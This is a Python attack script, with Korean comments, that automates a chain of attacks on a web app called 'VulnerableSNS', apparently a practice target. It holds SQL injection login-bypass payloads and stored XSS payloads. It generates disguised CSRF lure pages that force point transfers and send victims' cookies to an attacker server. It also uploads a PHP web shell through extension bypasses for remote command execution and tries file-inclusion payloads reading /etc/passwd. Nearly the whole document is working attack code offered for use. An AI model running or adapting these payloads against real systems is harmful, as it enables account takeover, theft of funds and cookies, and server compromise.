import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import time
import os
import base64

class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server="http://13.158.67.78:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.attacker_server = attacker_server  # CSRF 콜백 서버
        self.vulnerabilities = {
            'sql_injection': [],
            'xss': [],
            'csrf': [],
            'lfi': []
        }
    
    # ============ 1단계: SQL Injection 로그인 ============
    def step1_sqli_login(self):
        """SQL Injection으로 로그인"""
        print("\n" + "="*70)
        print("🔓 Step 1: SQL Injection 로그인")
        print("="*70)
        
        login_url = f"{self.base_url}/login.php"
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin' OR '1'='1'--", "password": ""},
            {"username": "admin' OR '1'='1'#", "password": ""},
        ]
        
        for payload in payloads:
            try:
                print(f"[*] 시도: {payload['username']}")
                response = self.session.post(login_url, data=payload, allow_redirects=True)
                
                # 로그인 성공 확인
                if 'index.php' in response.url or 'admin' in response.text:
                    print(f"[+] ✅ 로그인 성공!")
                    print(f"    Payload: {payload['username']}")
                    print(f"    리다이렉트: {response.url}")
                    
                    self.vulnerabilities['sql_injection'].append({
                        'url': login_url,
                        'payload': payload,
                        'type': 'authentication_bypass'
                    })
                    return True
                    
            except Exception as e:
                print(f"[-] 에러: {e}")
        
        return False
    
    # ============ 2단계: XSS - 게시물에 악성 스크립트 삽입 ============
    def step2_xss_post(self):
        """게시물에 XSS 페이로드 삽입"""
        print("\n" + "="*70)
        print("💉 Step 2: XSS 공격 - 게시물에 악성 스크립트 삽입")
        print("="*70)
        
        # index.php에 게시물 작성 (POST)
        post_url = f"{self.base_url}/post.php"  # 또는 index.php
        
        xss_payloads = [
            # Stored XSS - 댓글/게시물에 삽입
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(document.cookie)>",
            
            # CSRF 유도용 XSS (송금 링크 자동 클릭)
            f"<img src='{self.base_url}/transfer.php?to=attacker&amount=10000' style='display:none'>",
            f"<script>fetch('{self.base_url}/transfer.php?to=attacker&amount=10000')</script>",
        ]
        
        for payload in xss_payloads:
            try:
                # 게시물 작성
                data = {
                    'content': payload,
                    'message': payload,
                    'comment': payload
                }
                
                print(f"[*] XSS 페이로드 삽입 시도...")
                response = self.session.post(post_url, data=data)
                
                # 삽입 확인
                check_response = self.session.get(f"{self.base_url}/index.php")
                if payload in check_response.text:
                    print(f"[+] ✅ Stored XSS 성공!")
                    print(f"    Payload: {payload[:60]}...")
                    
                    self.vulnerabilities['xss'].append({
                        'url': post_url,
                        'payload': payload,
                        'type': 'stored',
                        'location': 'index.php'
                    })
                    return True
                    
            except Exception as e:
                print(f"[-] 에러: {e}")
        
        return False
    
    # ============ 3단계: CSRF - 송금 공격 ============
    def step3_csrf_attack(self):
        """CSRF로 포인트 송금"""
        print("\n" + "="*70)
        print("💸 Step 3: CSRF 공격 - 자동 송금")
        print("="*70)
        
        # 프로필 수정 페이지 분석
        profile_url = f"{self.base_url}/profile.php"
        
        try:
            response = self.session.get(profile_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form 분석
            forms = soup.find_all('form')
            for form in forms:
                print(f"[*] Form 발견: {form.get('action')}")
                
                # CSRF 토큰 확인
                has_csrf_token = False
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name', '').lower()
                    if 'csrf' in name or 'token' in name:
                        has_csrf_token = True
                        break
                
                if not has_csrf_token:
                    print(f"[+] ✅ CSRF 취약점 발견! (토큰 없음)")
                    
                    # CSRF 공격 HTML 생성
                    self.generate_csrf_exploit(form)
                    
                    self.vulnerabilities['csrf'].append({
                        'url': profile_url,
                        'form_action': form.get('action'),
                        'method': form.get('method', 'GET'),
                        'reason': 'No CSRF token'
                    })
            
            # GET 방식 CSRF 테스트 (예시에 나온 것처럼)
            csrf_test_url = f"{self.base_url}/profile.php?email=hacked@evil.com&full_name=Hacked"
            print(f"\n[*] GET 방식 CSRF 테스트...")
            print(f"    URL: {csrf_test_url}")
            
            test_response = self.session.get(csrf_test_url)
            if test_response.status_code == 200 and 'error' not in test_response.text.lower():
                print(f"[+] ✅ GET 방식 CSRF 성공!")
                
                # 송금 CSRF PoC 생성
                self.generate_transfer_csrf()
                
                return True
                
        except Exception as e:
            print(f"[-] 에러: {e}")
        
        return False
    
    def generate_csrf_exploit(self, form):
        """CSRF 공격 HTML 생성"""
        action_url = urljoin(self.base_url, form.get('action', ''))
        method = form.get('method', 'POST').upper()
        
        # 송금 시나리오
        csrf_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>무료 포인트 받기!</title>
</head>
<body>
    <h1>🎁 축하합니다! 10000P를 받으셨습니다!</h1>
    <p>아래 버튼을 클릭하여 포인트를 수령하세요.</p>
    
    <!-- 실제로는 송금 요청 -->
    <form id="csrf-form" action="{action_url}" method="{method}">
        <input type="hidden" name="to_user" value="attacker">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="email" value="attacker@evil.com">
        <button type="submit">포인트 받기</button>
    </form>
    
    <!-- 자동 제출 -->
    <script>
        // 페이지 로드 시 자동 제출
        window.onload = function() {{
            document.getElementById('csrf-form').submit();
            
            // 어태커 서버로 신호 전송
            fetch('{self.attacker_server}/notify?victim=admin&amount=10000');
        }};
    </script>
</body>
</html>"""
        
        filename = "csrf_exploit.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(csrf_html)
        print(f"[+] CSRF 공격 페이지 생성: {filename}")
    
    def generate_transfer_csrf(self):
        """송금 전용 CSRF PoC"""
        # GET 방식 (이미지 태그로 자동 실행)
        csrf_get_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>귀여운 고양이 사진 🐱</title>
</head>
<body>
    <h1>오늘의 귀여운 고양이</h1>
    <img src="https://placekitten.com/400/300" alt="고양이">
    
    <!-- 숨겨진 송금 요청 (GET) -->
    <img src="{self.base_url}/transfer.php?to=attacker&amount=10000" style="display:none">
    <img src="{self.base_url}/profile.php?email=hacked@evil.com" style="display:none">
    
    <script>
        // 어태커 서버로 결과 전송
        setTimeout(function() {{
            fetch('{self.attacker_server}/steal?cookie=' + document.cookie);
        }}, 2000);
    </script>
</body>
</html>"""
        
        with open("csrf_transfer_get.html", 'w', encoding='utf-8') as f:
            f.write(csrf_get_html)
        
        # XSS + CSRF 콤보 (게시물에 삽입할 코드)
        xss_csrf_payload = f"""<img src="{self.base_url}/transfer.php?to=attacker&amount=10000" onerror="fetch('{self.attacker_server}/success')">"""
        
        with open("xss_csrf_payload.txt", 'w') as f:
            f.write(xss_csrf_payload)
        
        print(f"[+] 송금 CSRF 생성 완료:")
        print(f"    - csrf_transfer_get.html")
        print(f"    - xss_csrf_payload.txt (게시물에 삽입용)")
    
    # ============ 4단계: LFI - 파일 업로드 우회 ============
    def step4_lfi_upload(self):
        """LFI/RCE - .php5 우회 파일 업로드"""
        print("\n" + "="*70)
        print("📁 Step 4: LFI/RCE - 파일 업로드 우회")
        print("="*70)
        
        upload_url = f"{self.base_url}/upload.php"  # 파일 업로드 페이지
        
        # 웹쉘 코드
        webshell_code = """<?php system($_GET['cmd']); ?>"""
        
        # .php5 우회 시도
        payloads = [
            ('shell.php5', webshell_code),
            ('shell.phtml', webshell_code),
            ('shell.php3', webshell_code),
            ('shell.php7', webshell_code),
            ('shell.pht', webshell_code),
        ]
        
        for filename, code in payloads:
            try:
                print(f"[*] 업로드 시도: {filename}")
                
                files = {
                    'file': (filename, code, 'application/x-php')
                }
                
                response = self.session.post(upload_url, files=files)
                
                # 업로드 성공 확인
                if 'success' in response.text.lower() or response.status_code == 200:
                    print(f"[+] ✅ 업로드 성공!")
                    
                    # 업로드된 파일 경로 찾기
                    soup = BeautifulSoup(response.text, 'html.parser')
                    uploaded_path = None
                    
                    # 예: uploads/shell.php5
                    for link in soup.find_all('a'):
                        href = link.get('href', '')
                        if filename in href:
                            uploaded_path = urljoin(self.base_url, href)
                            break
                    
                    if not uploaded_path:
                        uploaded_path = f"{self.base_url}/uploads/{filename}"
                    
                    # RCE 테스트
                    test_url = f"{uploaded_path}?cmd=whoami"
                    print(f"[*] RCE 테스트: {test_url}")
                    
                    test_response = self.session.get(test_url)
                    if test_response.status_code == 200:
                        print(f"[+] ✅ RCE 성공!")
                        print(f"    결과: {test_response.text[:100]}")
                        
                        self.vulnerabilities['lfi'].append({
                            'url': upload_url,
                            'filename': filename,
                            'uploaded_path': uploaded_path,
                            'type': 'file_upload_bypass_rce'
                        })
                        
                        return True
                        
            except Exception as e:
                print(f"[-] 에러: {e}")
        
        # LFI 테스트 (파일 포함 취약점)
        print(f"\n[*] LFI 테스트...")
        lfi_params = ['file', 'page', 'include', 'path']
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
        ]
        
        for param in lfi_params:
            for payload in lfi_payloads:
                try:
                    test_url = f"{self.base_url}/file.php?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    if 'root:' in response.text or 'PD9waHA' in response.text:  # base64
                        print(f"[+] ✅ LFI 발견!")
                        print(f"    Param: {param}")
                        print(f"    Payload: {payload}")
                        
                        self.vulnerabilities['lfi'].append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': 'local_file_inclusion'
                        })
                        return True
                        
                except:
                    pass
        
        return False
    
    # ============ 전체 공격 시나리오 실행 ============
    def run_full_attack(self):
        """전체 공격 시뮬레이션"""
        print("\n" + "="*70)
        print("🎯 VulnerableSNS 자동화 공격 시작")
        print("="*70)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*70)
        
        # 1. SQL Injection 로그인
        if not self.step1_sqli_login():
            print("\n[!] 로그인 실패. 수동으로 확인 필요.")
            return
        
        time.sleep(1)
        
        # 2. XSS 공격
        print("\n" + "-"*70)
        self.step2_xss_post()
        time.sleep(1)
        
        # 3. CSRF 공격
        print("\n" + "-"*70)
        self.step3_csrf_attack()
        time.sleep(1)
        
        # 4. LFI/RCE 공격
        print("\n" + "-"*70)
        self.step4_lfi_upload()
        
        # 결과 출력
        self.print_results()
        
        # 공격 시나리오 요약
        self.print_attack_scenario()
    
    def print_results(self):
        """결과 출력"""
        print("\n" + "="*70)
        print("📊 공격 결과 요약")
        print("="*70)
        
        total = sum(len(vulns) for vulns in self.vulnerabilities.values())
        print(f"\n✅ 총 {total}개 취약점 발견\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"🔴 [{vuln_type.upper()}] - {len(vulns)}개")
                for i, vuln in enumerate(vulns, 1):
                    print(f"   {i}. URL: {vuln.get('url', 'N/A')}")
                    if 'payload' in vuln:
                        print(f"      Payload: {str(vuln['payload'])[:60]}...")
                print()
        
        # JSON 저장
        import json
        with open('attack_report.json', 'w', encoding='utf-8') as f:
            json.dump(self.vulnerabilities, f, indent=2, ensure_ascii=False)
        
        print("[+] 상세 리포트: attack_report.json")
    
    def print_attack_scenario(self):
        """공격 시나리오 출력"""
        print("\n" + "="*70)
        print("🎬 실전 공격 시나리오")
        print("="*70)
        
        scenario = """
        1️⃣ SQL Injection으로 관리자 계정 탈취
           → login.php에서 admin' OR '1'='1 입력
        
        2️⃣ XSS를 이용한 악성 게시물 작성
           → index.php에 CSRF 유도 스크립트 삽입
           → 다른 사용자가 게시물 볼 때 자동 실행
        
        3️⃣ CSRF로 포인트 송금
           → 피해자가 악성 게시물 클릭
           → profile.php?email=attacker@evil.com 자동 호출
           → 또는 transfer.php?to=attacker&amount=10000 실행
           → 어태커 서버로 성공 신호 전송
        
        4️⃣ 파일 업로드 우회로 웹쉘 설치
           → shell.php5 업로드
           → /uploads/shell.php5?cmd=whoami 실행
           → 서버 완전 장악
        
        📁 생성된 파일:
           - csrf_exploit.html : CSRF 공격 페이지
           - csrf_transfer_get.html : 송금 전용 공격
           - xss_csrf_payload.txt : 게시물에 삽입할 코드
           - attack_report.json : 상세 리포트
        """
        print(scenario)


# ============ 실행 ============
if __name__ == "__main__":
    base_url = "http://18.179.53.107/vulnerable-sns/www"
    
    # 어태커 서버 설정 (실제로는 ngrok, RequestBin 등 사용)
    attacker_server = "http://YOUR-ATTACKER-SERVER.com"
    
    attacker = VulnerableSNSAttacker(base_url)
    attacker.attacker_server = attacker_server
    
    # 전체 공격 실행
    attacker.run_full_attack()
    
    print("\n" + "="*70)
    print("✅ 공격 시뮬레이션 완료!")
    print("="*70)